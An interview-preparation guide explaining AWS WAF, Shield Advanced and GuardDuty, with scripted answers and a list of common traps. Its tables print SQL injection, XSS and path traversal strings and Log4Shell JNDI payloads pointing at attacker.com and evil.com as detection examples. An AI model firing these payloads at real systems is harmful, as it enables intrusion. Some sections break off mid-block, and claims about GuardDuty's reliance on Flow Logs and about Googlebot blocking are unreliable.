## NEW LEARNER FOUNDATION — Read This First If You Are New

```
KEY TERMS EXPLAINED SIMPLY
============================

WAF (Web Application Firewall)
  A filter that reads every HTTP/HTTPS request BEFORE it reaches your app.
  It inspects: URL path, query parameters, headers, body, IP address.
  If a request matches a bad pattern (SQL injection, XSS), WAF blocks it
  and returns 403 to the attacker. Your Java app never sees the request.
  Think of it like a security guard at a building entrance — reading IDs
  and turning away anyone suspicious before they reach the office.

WEB ACL (Web Access Control List)
  The WAF "rulebook" you attach to a resource (CloudFront, ALB, API Gateway).
  A Web ACL contains rules, each with a condition and an action (BLOCK/ALLOW/COUNT).
  Rules are evaluated in priority order — lower number = evaluated first.
  Example: Web ACL with 3 rules:
    Priority 1: Allow your office IP range → ALLOW
    Priority 2: Block if rate > 2000 req/5min per IP → BLOCK
    Priority 3: AWSManagedRulesCommonRuleSet → BLOCK on SQLi/XSS

RULE GROUP
  A reusable collection of WAF rules. AWS provides "Managed Rule Groups"
  (pre-built by AWS security team). You can also create custom rule groups.
  You add a Rule Group to a Web ACL — it counts as one rule in the ACL
  but internally contains many sub-rules.

MANAGED RULES
  Pre-built rule groups maintained by AWS (and AWS Marketplace partners).
  AWS updates them automatically when new attack patterns emerge.
  Key ones:
    AWSManagedRulesCommonRuleSet       → OWASP Top 10 (SQLi, XSS, path traversal)
    AWSManagedRulesKnownBadInputsRuleSet → Log4Shell, Spring4Shell, etc.
    AWSManagedRulesBotControlRuleSet   → bot detection and blocking

SHIELD STANDARD
  FREE DDoS protection auto-enabled on every AWS account.
  Protects at Layer 3/4 (network/transport): UDP floods, SYN floods,
  DNS amplification attacks. No configuration needed. No SLA. No support team.

SHIELD ADVANCED
  Paid tier ($3,000/month per ORGANIZATION — one bill, covers all accounts).
  Adds Layer 7 (application-layer) DDoS protection, 24/7 AWS DDoS Response
  Team (DRT), and cost protection (AWS credits your bill for EC2/ELB/CloudFront
  costs that spiked during a DDoS attack).

GUARDDUTY
  A threat detection service that watches your AWS account for suspicious
  behavior. It reads CloudTrail (API calls), VPC Flow Logs (network traffic),
  and DNS logs — feeds them into ML models — and raises "findings" when
  something looks wrong.
  It does NOT block anything. It only detects and alerts.
  Think of it like a security camera that records everything and raises an
  alarm when it spots unusual behavior — it doesn't lock the door itself,
  but it alerts security (Lambda / PagerDuty) who can act.

FINDING
  A GuardDuty alert. Each finding has a severity (LOW / MEDIUM / HIGH),
  a type (e.g., "UnauthorizedAccess:EC2/CryptoMiner"), and details about
  what was detected. Findings go to GuardDuty console + EventBridge.

VPC FLOW LOGS
  A record of every network connection accepted or rejected in your VPC.
  Each log line: source IP, dest IP, port, protocol, bytes, accept/reject.
  GuardDuty reads these to detect port scans, data exfiltration, crypto
  mining traffic (connections to mining pools).

CLOUDTRAIL
  A record of every AWS API call in your account: who called what, when,
  from where. GuardDuty reads CloudTrail to detect unusual API activity
  (e.g., an EC2 instance suddenly calling IAM:CreateUser — suspicious!).
```

## SECTION 1 — AWS WAF: Web Application Firewall

---

### PART 1A — When They Ask: "What is AWS WAF and where do you attach it?"

> **You say:**
>
> "AWS WAF is a Web Application Firewall that inspects HTTP/HTTPS requests
> before they reach your application. You create a Web ACL — a rulebook —
> and attach it to a resource. The four supported attachment points are:
> CloudFront distributions, Application Load Balancers, API Gateway REST
> APIs, and AppSync GraphQL APIs.
>
> This is a critical architectural point: WAF operates inline. The request
> hits WAF, WAF evaluates it against rules in priority order, and then either
> allows it through or blocks it with a 403 — your Java application never
> executes for blocked requests. Zero code change required."

```
WAF ATTACHMENT POINTS
======================

  Internet
     │
     ├──► CloudFront ──── [WAF Web ACL] ← MUST be in us-east-1 ⚠️
     │          │
     │          ▼
     │        ALB ──────── [WAF Web ACL] ← same region as ALB ✅
     │          │
     │          ▼
     │        API Gateway ─ [WAF Web ACL] ← same region as API GW ✅
     │
     └──► AppSync ────────── [WAF Web ACL] ← same region ✅

  WAF evaluates rules in PRIORITY ORDER (lower number first):
  ┌──────────────┬───────────────────────────────────────┬────────┐
  │ Priority     │ Rule                                  │ Action │
  ├──────────────┼───────────────────────────────────────┼────────┤
  │ 1 (first)    │ Allow office IP: 203.0.113.0/24       │ ALLOW  │
  │ 2            │ Rate: > 2000 req / 5min per IP         │ BLOCK  │
  │ 3            │ AWSManagedRulesCommonRuleSet           │ BLOCK  │
  │ 4            │ AWSManagedRulesKnownBadInputsRuleSet   │ BLOCK  │
  │ 5 (last)     │ Default action                        │ ALLOW  │
  └──────────────┴───────────────────────────────────────┴────────┘
  First match wins — once a rule matches, remaining rules are skipped.
```

### PART 1B — When They Ask: "What AWS Managed Rules do you use and what do they protect against?"

> **You say:**
>
> "I use three managed rule groups for a production API platform.
>
> First: AWSManagedRulesCommonRuleSet. This covers the OWASP Top 10 —
> SQL injection like `' OR 1=1--` in search fields, XSS like
> `<script>alert(1)</script>` in review text, and path traversal like
> `../../etc/passwd` in file download URLs. This is table stakes for any
> public API.
>
> Second: AWSManagedRulesKnownBadInputsRuleSet. This blocks the Log4Shell
> exploit — `${jndi:ldap://attacker.com/a}` — which targets Log4j in Java
> apps. Also catches Spring4Shell. AWS added these rules within hours of
> the Log4Shell disclosure in December 2021. If you had this rule group
> attached, you were protected before your team even knew about the CVE.
>
> Third: AWSManagedRulesBotControlRuleSet. Detects and blocks automated
> bots — price scrapers, credential stuffers, inventory hoarding bots.
> Important gotcha here: this rule group will block Google Bot if you use
> it on your web app — you must whitelist Google's IP ranges or use the
> 'Count' action during testing."

```
OWASP TOP 10 — WAF COVERAGE
=============================

  Attack Type     Example Payload                      Managed Rule
  ──────────────────────────────────────────────────────────────────────
  SQL Injection   ' OR 1=1--                           CommonRuleSet
                  UNION SELECT * FROM users--           CommonRuleSet
                  1; DROP TABLE orders--               CommonRuleSet

  XSS             <script>document.cookie</script>     CommonRuleSet
                  <img onerror=alert(1) src=x>         CommonRuleSet
                  javascript:alert(1)                  CommonRuleSet

  Path Traversal  ../../etc/passwd                     CommonRuleSet
                  ..%2F..%2Fetc%2Fshadow               CommonRuleSet

  Log4Shell       ${jndi:ldap://evil.com/a}            KnownBadInputsRuleSet
                  ${${lower:j}ndi:ldap://evil.com}     KnownBadInputsRuleSet

  Spring4Shell    class.module.classLoader             KnownBadInputsRuleSet

  Bot/Scraping    Automated price scraping             BotControlRuleSet
                  Credential stuffing                  BotControlRuleSet

  WAF inspects: URL path, query string, headers, body, cookies, IP
  WAF operates BEFORE your Java app — zero code change needed
```

### PART 1C — When They Ask: "How do you protect against scraping and credential stuffing?"

> **You say:**
>
> "Rate-based rules are the primary tool. You define a threshold — say
> 2,000 requests per 5 minutes per IP — and WAF automatically blocks any
> IP that exceeds it. The block is auto-removed after the rate drops below
> threshold.
>
> For our food delivery login endpoint, I set a tighter limit: 100 requests
> per 5 minutes per IP. A real user doesn't log in 100 times in 5 minutes.
> This stops credential stuffing bots while allowing legitimate users.
>
> The rate-based rule evaluates the last 5-minute rolling window continuously,
> so there's no delay — an attacker is blocked within seconds of exceeding
> the threshold."

```
RATE-BASED RULE — FOOD DELIVERY LOGIN PROTECTION
==================================================

  Normal user:    1-3 login attempts / day → WAF allows ✅
  Forgot password: maybe 5 attempts / hour → WAF allows ✅
  Bot attack:     500 attempts / minute from same IP → WAF blocks ✅

  Rate-based rule configuration:
  ┌────────────────────────────────────────────────────────────┐
  │  Rule name: BlockHighRateLogin                             │
  │  Rate key: IP address                                      │
  │  Threshold: 100 requests per 5-minute window              │
  │  Scope: /api/auth/login (URI path scope-down statement)   │
  │  Action: BLOCK (returns 403)                               │
  └────────────────────────────────────────────────────────────┘

  Auto-block timeline:
  ─────────────────────────────────────────────────────────────
  T+0:00  Bot starts sending login requests
  T+0:30  Bot has sent 100 requests in 30 seconds
  T+0:30  WAF detects rate exceeded → IP auto-blocked → 403
  T+5:30  Rolling window shifts → if rate dropped → auto-unblocked
  ─────────────────────────────────────────────────────────────
  No human intervention needed.
```

### PART 1D — CRITICAL GOTCHA: WAF for CloudFront MUST Be in us-east-1

> **You say:**
>
> "This is the trap that catches people in production. When you attach a
> WAF Web ACL to an ALB, you create the Web ACL in the same region as the
> ALB — ap-south-1 for Mumbai, ap-southeast-1 for Singapore, etc. That's
> intuitive.
>
> CloudFront is different. CloudFront is a global service but it is
> operationally managed from us-east-1. When you create a Web ACL to
> attach to CloudFront, you MUST create that Web ACL in us-east-1 —
> even if all your infrastructure is in ap-south-1.
>
> If you create the Web ACL in ap-south-1 and try to attach it to
> CloudFront, you get an error: 'WAF Web ACL ARN is not in us-east-1.'
> The WAF console in ap-south-1 does not show CloudFront as an available
> resource. This burns people during interviews and in production."

```
WAF REGION REQUIREMENT — THE CRITICAL GOTCHA
=============================================

  WRONG (will fail with error):
  ─────────────────────────────
  Region: ap-south-1 (Mumbai)
  WAF Web ACL: arn:aws:wafv2:ap-south-1:123456:global/webacl/MyACL/xxx
  Attach to: CloudFront distribution
  Result: ERROR — "WAF Web ACL must be in us-east-1 for CloudFront" ✗

  CORRECT:
  ──────────────────────────────────────────────────────────────────
  For CloudFront:
    Create Web ACL in: us-east-1 (N. Virginia)
    Scope: CLOUDFRONT (global)
    Attach to: CloudFront distribution ✅

  For ALB in ap-south-1:
    Create Web ACL in: ap-south-1 (Mumbai)
    Scope: REGIONAL
    Attach to: ALB in ap-south-1 ✅

  FOOD DELIVERY EXAMPLE — Two Web ACLs:
  ──────────────────────────────────────
  Web ACL 1: "FoodApp-CloudFront-WAF"
    Region: us-east-1
    Scope: CLOUDFRONT
    Rules: BotControl + CommonRuleSet + rate-limit 10k/5min

  Web ACL 2: "FoodApp-ALB-WAF"
    Region: ap-south-1
    Scope: REGIONAL
    Rules: CommonRuleSet + KnownBadInputsRuleSet + rate-limit login

  WHY CLOUDFRONT NEEDS us-east-1:
    CloudFront runs from 400+ edge locations globally.
    AWS controls CloudFront configuration from their us-east-1 control plane.
    WAF rules for CloudFront are distributed to all edge PoPs from us-east-1.
    There is no regional WAF config for a global service.
```

### PART 1E — When They Ask: "How do you test WAF rules without breaking production?"

> **You say:**
>
> "Use Count mode before Block mode. Instead of setting a rule to BLOCK,
> set it to COUNT. In Count mode, WAF evaluates the rule, increments a
> counter in CloudWatch metrics, logs the match — but allows the request
> through. You can observe for 1-2 weeks to see which real user requests
> would have been blocked.
>
> This is how I handled the BotControlRuleSet — when I first added it in
> Count mode, I discovered it was flagging Google Bot and our own
> monitoring health checks. I added exception rules for these before
> switching to Block mode.
>
> Rule priorities also matter here. An ALLOW rule for monitoring IPs must
> have a lower priority number than the BotControl rule group, so it
> evaluates first — otherwise BotControl fires before the allowlist is
> checked."

```
COUNT MODE WORKFLOW — SAFE WAF RULE TESTING
============================================

  Week 1: Add new rule in COUNT mode
  ─────────────────────────────────
  Rule: AWSManagedRulesBotControlRuleSet → Action: COUNT (not BLOCK)
  Requests that match: allowed through ✅, but logged + counted

  CloudWatch Metric: aws-waf-logs-* → AllowedRequests vs CountedRequests

  Review CloudWatch Logs:
  {
    "action": "COUNT",
    "terminatingRuleId": "BotControl",
    "httpRequest": {
      "uri": "/menu/search",
      "headers": {"user-agent": "Googlebot/2.1"}  ← Google Bot! Don't block!
    }
  }

  Week 2: Add exceptions BEFORE switching to BLOCK
  ─────────────────────────────────────────────────
  Priority 1: Allow known-good bots (Googlebot, monitoring) → ALLOW
  Priority 2: BotControlRuleSet → BLOCK  (now safe to block)

  PRIORITY ORDER MATTERS:
  Priority 1: AllowGoogleBot  (lower number = evaluated first)
  Priority 2: BotControlRuleSet
  If priorities were reversed: BotControl blocks Google before allowlist runs!
```

### PART 2B — When They Ask: "How do Shield and WAF work together?"

> **You say:**
>
> "They protect different attack layers and are complementary.
>
> Shield absorbs volumetric attacks — a 1 Tbps UDP flood that would
> saturate your internet connection. This happens at the AWS edge, before
> traffic enters your stack. Shield can't read HTTP request content.
>
> WAF blocks application-layer attacks — a SQL injection in a query
> parameter, a Log4Shell payload in a header, or a bot sending 50,000
> login attempts per minute. WAF reads HTTP content but can't absorb
> volumetric floods.
>
> The correct architecture is: Shield at the edge absorbs the volume,
> WAF on CloudFront/ALB inspects what gets through."

```
SHIELD + WAF — LAYERED ATTACK DEFENSE
=======================================

  Attack Type           Shield    WAF       Neither
  ─────────────────────────────────────────────────────────────
  UDP flood (1 Tbps)     Yes       No        —
  SYN flood              Yes       No        —
  DNS amplification      Yes       No        —
  HTTP flood (volume)    Yes(Adv)  Yes       —
  SQL injection          No        Yes       —
  XSS                    No        Yes       —
  Log4Shell payload      No        Yes       —
  Credential stuffing    No        Yes       —
  Crypto miner (insider) No        No        GuardDuty

  HOW AN ATTACK FLOWS:
  ─────────────────────────────────────────────────────────────
  Attacker sends:
  (A) 500 Gbps UDP flood + (B) SQL injection in /search?q=...

  (A) UDP flood:
      Hits AWS edge → Shield absorbs → never reaches CloudFront ✅

  (B) SQL injection:
      Passes Shield (it's normal HTTP volume) → reaches CloudFront
      → WAF inspects request body → matches CommonRuleSet → 403 ✅

```

## SECTION 3 — Amazon GuardDuty: Threat Detection

---

### PART 3A — When They Ask: "What is GuardDuty and what does it detect?"

> **You say:**
>
> "GuardDuty is AWS's threat intelligence and ML-based anomaly detection
> service. It continuously analyzes four data sources: CloudTrail API logs,
> VPC Flow Logs, Route 53 DNS query logs, and S3 access logs. It feeds
> these into machine learning models trained on known attack patterns and
> flags suspicious behaviors as 'findings.'
>
> GuardDuty does NOT block anything — it is pure detection and alerting.
> The key gotcha: GuardDuty is NOT enabled by default. You must explicitly
> enable it per region, per account. You can enable it org-wide via AWS
> Organizations if you want centralized coverage.
>
> And it only reads those four data sources — if VPC Flow Logs are not
> enabled for your VPC, GuardDuty has no network traffic data."

```
GUARDDUTY — DATA SOURCES AND FINDING CATEGORIES
=================================================

## SECTION 4 — Defense in Depth: All 6 Layers Together

---

### PART 4 — When They Ask: "Design the security architecture for a food delivery platform"

> **You say:**
>
> "I design security in six layers because no single layer is sufficient.
> An attacker who bypasses one layer should hit the next.
>
> Layer 1 is Shield at the AWS edge — absorbs volumetric DDoS before
> it reaches my infrastructure.
>
> Layer 2 is WAF on CloudFront and ALB — blocks HTTP-layer attacks:
> SQL injection, XSS, Log4Shell, bot credential stuffing. WAF runs
> before my Java application code executes.
>
> Layer 3 is Security Groups and NACLs — network-level controls. My
> EKS pods only accept traffic from the ALB security group. RDS only
> accepts traffic from the app security group. No public IP on any
> backend resource.
>
> Layer 4 is application authentication — Cognito for user auth with
> JWT tokens validated in Spring Security. Restaurant owners are
> scoped to their own data via IAM and application-level tenant
> isolation.
>
> Layer 5 is GuardDuty — behavioral detection for what gets through
> the first four layers. Crypto mining EC2s, unusual API patterns,
> compromised credentials.
>
> Layer 6 is CloudTrail and CloudWatch — the immutable audit trail
> and alarm layer. Alert on root login, IAM policy changes, security
> group rule changes."

## SECTION 5 — OWASP Top 10 Coverage via WAF Managed Rules

---

### PART 5 — When They Ask: "How does WAF protect against OWASP Top 10?"

> **You say:**
>
> "The AWSManagedRulesCommonRuleSet covers the OWASP Top 10 without any
> code changes to my application. WAF intercepts the request, inspects
> every component — URL, query string, headers, body — and blocks it
> if it matches known attack signatures.
>
> For SQL injection: WAF detects patterns like `' OR 1=1--`,
> `UNION SELECT`, and `; DROP TABLE` in any request parameter.
> My Spring Boot's JPA uses parameterized queries too, but WAF catches
> malformed input before it even reaches the @RequestParam binding.
>
> For Log4Shell specifically: the AWSManagedRulesKnownBadInputsRuleSet
> detects `${jndi:ldap://` and its obfuscated variants like
> `${${lower:j}ndi:ldap://}`. AWS pushed this rule within hours of
> the CVE-2021-44228 disclosure. Companies that had this rule group
> were protected before they could even patch Log4j."

```

=======================================================

  WITHOUT WAF:
  ─────────────────────────────────────────────────────────────────
  Request: GET /restaurants?city=' OR 1=1--&limit=10
  Path: → CloudFront → ALB → EKS → Spring Boot @RequestParam

  WITH WAF:
  ─────────────────────────────────────────────────────────────────
  Request: GET /restaurants?city=' OR 1=1--&limit=10
  Path: → CloudFront → WAF inspects query string

  Spring Boot: never executes. Never reaches your code.

## COMMON TRAPS — What the Interviewer Is Testing

```
TRAP 1: WAF in wrong region for CloudFront
──────────────────────────────────────────
WRONG: Create Web ACL in ap-south-1, attach to CloudFront → ERROR
RIGHT: Create Web ACL in us-east-1 (N. Virginia), scope = CLOUDFRONT
Why: CloudFront is managed from us-east-1 control plane globally.
The WAF console in other regions shows "REGIONAL" resources only.

TRAP 2: Shield Advanced billed per organization, not per account
─────────────────────────────────────────────────────────────────
WRONG: "$3,000 per account — we have 50 accounts, that's $150,000/month"
RIGHT: "$3,000 per AWS Organization total — covers all 50 accounts"
Why: Shield Advanced pricing is at the org level via AWS Organizations.
$3,000/month is often cheaper than one hour of downtime for a fintech.

TRAP 3: GuardDuty is NOT enabled by default
────────────────────────────────────────────
WRONG: "GuardDuty automatically monitors all my accounts"
RIGHT: GuardDuty must be explicitly enabled per region, per account.
Also: it must be enabled in EVERY region you want coverage for.
Use AWS Organizations + delegated admin account for org-wide coverage.

TRAP 4: BotControlRuleSet blocks Google Bot
────────────────────────────────────────────
WRONG: "I added BotControlRuleSet to block all bots — easy win"
RIGHT: BotControlRuleSet blocks ALL bots including Googlebot, Bing,
monitoring health checks, and synthetic testing tools.
Always add a higher-priority ALLOW rule for known-good bots before
switching BotControlRuleSet from COUNT to BLOCK mode.

TRAP 5: WAF rule priority — lower number evaluated FIRST
──────────────────────────────────────────────────────────
WRONG: "I put my ALLOW rule at priority 100 and BotControl at priority 1"
RIGHT: Lower priority number = evaluated first. If BotControl (1) fires
before ALLOW rule (100), legitimate traffic gets blocked.
Always: ALLOW rules at low numbers, BLOCK rules at higher numbers.

TRAP 6: Count mode before Block mode — always
──────────────────────────────────────────────
WRONG: "I add new managed rules in BLOCK mode immediately"
RIGHT: Always add new rules in COUNT mode for 1-2 weeks.
Watch CloudWatch Logs for false positives. Then switch to BLOCK.
Skipping COUNT mode can block legitimate users on day 1 in production.

TRAP 7: VPC Flow Logs must be enabled for GuardDuty network detection
──────────────────────────────────────────────────────────────────────
WRONG: "Enabling GuardDuty gives full visibility into network traffic"
RIGHT: GuardDuty reads VPC Flow Logs — but Flow Logs must be enabled
separately. Enabling GuardDuty without VPC Flow Logs = no network findings.
Also: GuardDuty reading Flow Logs is separate billing from Flow Logs storage.

TRAP 8: WAF cost surprise on high-traffic endpoints
─────────────────────────────────────────────────────
WRONG: "WAF pricing is just $5/month per Web ACL — cheap!"
RIGHT: Request fee is $0.60 per million requests.
2 billion requests/month = $1,200 in request fees alone.
+ $5 Web ACL + rules = ~$1,220/month.
Size WAF coverage by endpoint — attach to API paths only if cost is concern.
```
